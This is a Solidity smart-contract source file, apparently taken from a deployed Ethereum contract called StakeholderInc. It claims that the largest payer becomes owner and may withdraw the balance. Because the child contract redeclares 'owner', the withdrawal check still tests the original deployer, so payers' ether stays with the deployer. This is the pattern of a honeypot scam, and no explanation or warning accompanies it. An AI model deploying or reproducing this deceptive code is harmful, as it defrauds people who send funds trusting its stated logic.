/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract StakeholderInc at 0x4fed7f5f0314bd156a8486fc41dc8bd4737c24fb
*/
pragma solidity ^0.4.19;

contract Ownable {
    address public owner;
    
    function Ownable() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract StakeholderInc is Ownable {
    address public owner;

    uint public largestStake;

    function purchaseStake() public payable {
        // if you own a largest stake in a company, you own a company
        if (msg.value > largestStake) {
            owner = msg.sender;
            largestStake = msg.value;
        }
    }

    function withdraw() public onlyOwner {
        // only owner can withdraw funds
        msg.sender.transfer(this.balance);
    }
}